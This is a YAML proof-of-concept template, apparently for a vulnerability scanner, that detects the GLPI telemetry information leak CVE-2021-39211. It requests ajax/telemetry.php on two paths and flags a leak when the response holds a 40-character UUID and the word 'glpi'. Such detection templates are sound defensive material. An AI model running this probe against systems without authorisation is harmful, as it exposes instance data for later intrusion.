name: poc-yaml-glpi-telemetry-cve-2021-39211-info-leak
binding: 6376a22d-1a53-4e98-aa98-0269eed3b37e
manual: true
detail:
    author: z92g(https://github.com/z92g)
    links:
        - https://github.com/glpi-project/glpi/security/advisories/GHSA-xx66-v3g5-w825
    vulnerability:
        id: CT-182601
        level: medium
transport: http
payloads:
    payloads:
        req01:
            urlpath: |
                "ajax/telemetry.php"
        req02:
            urlpath: |
                "glpi/ajax/telemetry.php"
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /{{urlpath}}
        expression: |-
            response.status == 200 && '"uuid": ".{40}"'.bmatches(response.body) && response.body.bcontains(bytes("glpi"))
expression: r0()
